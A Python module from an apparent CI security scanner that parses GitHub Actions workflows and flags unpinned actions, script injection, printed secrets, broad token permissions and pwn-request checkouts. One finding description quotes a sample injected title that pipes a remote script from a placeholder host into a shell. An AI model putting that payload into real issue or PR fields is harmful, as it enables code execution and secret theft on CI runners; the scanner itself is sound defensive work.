"""Risky GitHub Actions configuration."""
from __future__ import annotations

import re
from pathlib import Path

import yaml

from .models import Finding, Severity

SHA = re.compile(r"[0-9a-f]{40}")
FIRST_PARTY = {"actions", "github"}

# Contexts an outside contributor controls (GitHub docs: "Security hardening for GitHub Actions").
UNTRUSTED = re.compile(
    r"\$\{\{[^}]*?\b("
    r"github\.event\.(?:issue\.(?:title|body)"
    r"|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)"
    r"|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)"
    r"|pages\.[\w*\[\]]+\.page_name|commits\.[\w*\[\]]+\.(?:message|author\.(?:email|name))"
    r"|head_commit\.(?:message|author\.(?:email|name)|committer\.(?:email|name))"
    r"|workflow_run\.(?:head_branch|display_title|head_commit\.(?:message|author\.(?:email|name))))"
    r"|github\.head_ref)\b[^}]*\}\}")
INPUTS = re.compile(r"\$\{\{[^}]*?\b((?:github\.event\.)?inputs\.[\w-]+)[^}]*\}\}")
SECRET_EXPR = re.compile(r"\$\{\{\s*secrets\.[\w-]+\s*\}\}")
PRINTS = re.compile(r"(?:^|[\s;&(])(?:echo|printf|cat|print|Write-Host|Write-Output)\b")
PR_HEAD = re.compile(r"github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(?:sha|branch)"
                     r"|refs/pull/")


class LineLoader(yaml.SafeLoader):
    """SafeLoader that records each mapping's line number under '__line__'."""


def _construct_mapping(loader, node):
    mapping = yaml.SafeLoader.construct_mapping(loader, node, deep=True)
    mapping["__line__"] = node.start_mark.line + 1
    return mapping


LineLoader.add_constructor(yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _construct_mapping)


def items(d):
    return [(k, v) for k, v in (d or {}).items() if k != "__line__"] if isinstance(d, dict) else []


def triggers(data: dict) -> set[str]:
    on = data.get("on", data.get(True))      # YAML 1.1 reads a bare `on` key as True
    if isinstance(on, str):
        return {on}
    if isinstance(on, list):
        return {str(x) for x in on}
    return {str(k) for k, _ in items(on)}


def find_line(lines: list[str], start: int, needle: str, limit: int = 400) -> int:
    for i in range(max(start - 1, 0), min(len(lines), start - 1 + limit)):
        if needle in lines[i]:
            return i + 1
    return start


def key_line(lines: list[str], start: int, key: str) -> int:
    pat = re.compile(rf"^\s*(?:-\s+)?{re.escape(key)}\s*:")
    for i in range(max(start - 1, 0), min(len(lines), start + 60)):
        if pat.match(lines[i]):
            return i + 1
    return start


def is_false(value) -> bool:
    return value is False or str(value).strip().lower() in ("false", "no", "off", "0")


class Checker:
    def __init__(self, rel: str, text: str):
        self.rel, self.text, self.lines = rel, text, text.splitlines()
        self.findings: list[Finding] = []

    def add(self, rule, sev, title, line, description, fix, evidence=""):
        self.findings.append(Finding(rule=f"workflow/{rule}", category="workflows", severity=sev,
                                     title=title, file=self.rel, line=line, description=description,
                                     fix=fix, evidence=evidence.strip()[:160]))

    def evidence(self, line: int) -> str:
        return self.lines[line - 1] if 0 < line <= len(self.lines) else ""

    # -- rules -------------------------------------------------------------
    def check_uses(self, uses: str, line: int) -> None:
        uses = str(uses).strip()
        if uses.startswith(("./", ".\\")):
            return
        ln = find_line(self.lines, line, uses)
        if uses.startswith("docker://"):
            if "@sha256:" not in uses:
                self.add("unpinned-action", Severity.MEDIUM, f"Docker image `{uses}` is not pinned by digest", ln,
                         "Image tags can be re-pushed, so the code this step runs can change without any change to your repo.",
                         "Pin the image by digest: `docker://image@sha256:<digest>`.", self.evidence(ln))
            return
        name, _, ref = uses.partition("@")
        owner = name.split("/")[0].lower()
        if ref and SHA.fullmatch(ref):
            return
        sev = Severity.LOW if owner in FIRST_PARTY else Severity.MEDIUM
        repo = "/".join(name.split("/")[:2])
        who = "GitHub's own action" if owner in FIRST_PARTY else "a third-party action"
        desc = (f"`{uses}` uses {who} by a {'tag or branch' if ref else 'default branch (no version at all)'}. "
                "Tags and branches can be moved to different code, so if the action's repository is compromised "
                "your workflow silently runs the attacker's code with access to your secrets. That's what happened "
                "in the March 2025 tj-actions/changed-files compromise: its version tags were moved to malicious "
                "code that dumped CI secrets into build logs. A full commit SHA is the only immutable reference.")
        fix = (f"Pin to the commit SHA and keep the version as a comment: `uses: {name}@<40-char-sha> # {ref or 'version'}`. "
               f"Get the SHA with `git ls-remote https://github.com/{repo} refs/tags/{ref or '<tag>'}`. "
               "Dependabot (package-ecosystem: github-actions) keeps pinned SHAs up to date.")
        self.add("unpinned-action", sev, f"Action `{uses}` is not pinned to a commit SHA", ln, desc, fix, self.evidence(ln))

    def check_script(self, script: str, line: int, where: str) -> None:
        for m in UNTRUSTED.finditer(script):
            ln = find_line(self.lines, line, m.group(0))
            self.add("script-injection", Severity.HIGH,
                     f"Untrusted `{m.group(1)}` is inserted directly into a {where}", ln,
                     f"`{m.group(1)}` is controlled by whoever opens the issue, PR or commit. GitHub pastes "
                     "`${{ }}` expressions into the script before it runs, so a title like "
                     "`\"; curl evil.sh | sh; #` runs as code on your runner, with your token and secrets.",
                     "Pass it through an environment variable and quote it: "
                     f"`env: VALUE: ${{{{ {m.group(1)} }}}}` then use `\"$VALUE\"` in the script.",
                     self.evidence(ln))
        for m in INPUTS.finditer(script):
            ln = find_line(self.lines, line, m.group(0))
            self.add("input-injection", Severity.LOW,
                     f"Workflow input `{m.group(1)}` is inserted directly into a {where}", ln,
                     "Inputs come from whoever triggers the workflow. Only people with write access can do that, "
                     "but a value containing quotes or `;` still runs as code.",
                     f"Use an environment variable: `env: VALUE: ${{{{ {m.group(1)} }}}}` then `\"$VALUE\"`.",
                     self.evidence(ln))
        for offset, text in enumerate(script.splitlines()):
            if SECRET_EXPR.search(text) and PRINTS.search(text) and "add-mask" not in text \
                    and "|" not in text and ">" not in text:
                ln = find_line(self.lines, line, text.strip())
                self.add("secret-printed", Severity.MEDIUM, "A secret is printed in a run step", ln,
                         "GitHub masks known secret values in logs, but masking fails as soon as the value is "
                         "transformed (base64, split, JSON-escaped), and anyone with read access can see logs.",
                         "Don't print secrets. Pass them to commands through environment variables.",
                         self.evidence(ln))

    def check_permissions(self, data: dict, jobs: list) -> None:
        top = data.get("permissions")
        jobs_line = key_line(self.lines, 1, "jobs")
        if top == "write-all":
            ln = key_line(self.lines, 1, "permissions")
            self.add("write-all", Severity.HIGH, "Workflow grants `write-all` permissions", ln,
                     "Every job gets write access to code, releases, packages and more. Any compromised step can push code.",
                     "Replace with the minimum needed, e.g. `permissions: { contents: read }`.", self.evidence(ln))
        for jid, job in jobs:
            if isinstance(job, dict) and job.get("permissions") == "write-all":
                ln = key_line(self.lines, job.get("__line__", 1), "permissions")
                self.add("write-all", Severity.HIGH, f"Job `{jid}` grants `write-all` permissions", ln,
                         "This job gets write access to everything the token can reach.",
                         "Grant only the scopes the job uses, e.g. `contents: read`.", self.evidence(ln))
        if top is None:
            loose = [jid for jid, job in jobs if isinstance(job, dict) and "permissions" not in job]
            if loose:
                self.add("missing-permissions", Severity.MEDIUM, "Workflow doesn't limit GITHUB_TOKEN permissions",
                         jobs_line,
                         f"No `permissions:` block at the top or on job(s) {', '.join(f'`{j}`' for j in loose)}. "
                         "They get the repository's default token scope, which on many repos and organisations "
                         "is read/write to contents, issues, packages and more.",
                         "Add a top-level `permissions:` block with `contents: read`, and grant extra scopes "
                         "only on the jobs that need them.")

    def check_checkout(self, step: dict, events: set[str]) -> None:
        with_ = step.get("with") or {}
        line = step.get("__line__", 1)
        ref = str(with_.get("ref", ""))
        if events & {"pull_request_target", "workflow_run"} and PR_HEAD.search(ref):
            ln = find_line(self.lines, line, "ref")
            self.add("pwn-request", Severity.CRITICAL,
                     "Pull request code is checked out in a privileged workflow", ln,
                     "`pull_request_target` and `workflow_run` run with your secrets and a write token. Checking "
                     "out the PR's code there and building or testing it lets anyone with a fork run code "
                     "with those privileges (a \"pwn request\").",
                     "Use the `pull_request` trigger for building untrusted code. If you need privileges, split "
                     "it into an unprivileged `pull_request` build and a separate privileged job that only "
                     "consumes its artifacts.", self.evidence(ln))
        if not is_false(with_.get("persist-credentials", True)):
            ln = find_line(self.lines, line, "checkout")
            self.add("persist-credentials", Severity.LOW, "Checkout leaves the GitHub token on disk", ln,
                     "`actions/checkout` saves the token in `.git/config` by default, where every later step "
                     "(and anything that uploads the workspace as an artifact) can read it.",
                     "Add `with: persist-credentials: false` unless a later step needs to push with git.",
                     self.evidence(ln))

    # -- driver -----------------------------------------------------------
    def run(self) -> list[Finding]:
        data = yaml.load(self.text, Loader=LineLoader)
        if not isinstance(data, dict):
            return []
        is_action = "runs" in data and "jobs" not in data
        events = triggers(data)
        if is_action:
            steps_by_job = [("action", (data.get("runs") or {}).get("steps") or [])]
            jobs = []
        else:
            jobs = items(data.get("jobs"))
            steps_by_job = []
            for jid, job in jobs:
                if not isinstance(job, dict):
                    continue
                if job.get("uses"):
                    self.check_uses(job["uses"], job.get("__line__", 1))
                steps_by_job.append((jid, job.get("steps") or []))
            self.check_permissions(data, jobs)
        for _, steps in steps_by_job:
            for step in steps:
                if not isinstance(step, dict):
                    continue
                line = step.get("__line__", 1)
                uses = str(step.get("uses") or "")
                if uses:
                    self.check_uses(uses, line)
                    if uses.split("@")[0].lower() == "actions/checkout":
                        self.check_checkout(step, events)
                    if uses.split("@")[0].lower() == "actions/github-script":
                        self.check_script(str((step.get("with") or {}).get("script", "")), line, "github-script")
                if step.get("run"):
                    self.check_script(str(step["run"]), line, "`run` script")
        return self.findings


def find_workflow_files(files: list[str]) -> list[str]:
    out = []
    for rel in files:
        if re.fullmatch(r"\.github/workflows/[^/]+\.ya?ml", rel) or rel in ("action.yml", "action.yaml") \
                or re.fullmatch(r"\.github/actions/[^/]+/action\.ya?ml", rel):
            out.append(rel)
    return sorted(out)


def scan(root: Path, files: list[str]) -> tuple[list[Finding], dict, list[str]]:
    findings, notes = [], []
    targets = find_workflow_files(files)
    for rel in targets:
        try:
            text = (root / rel).read_text(encoding="utf-8", errors="replace")
            findings += Checker(rel, text).run()
        except yaml.YAMLError as exc:
            mark = getattr(exc, "problem_mark", None)
            notes.append(f"Couldn't parse {rel}" + (f" (line {mark.line + 1})" if mark else "") + "; skipped it.")
    return findings, {"workflows_scanned": len(targets)}, notes
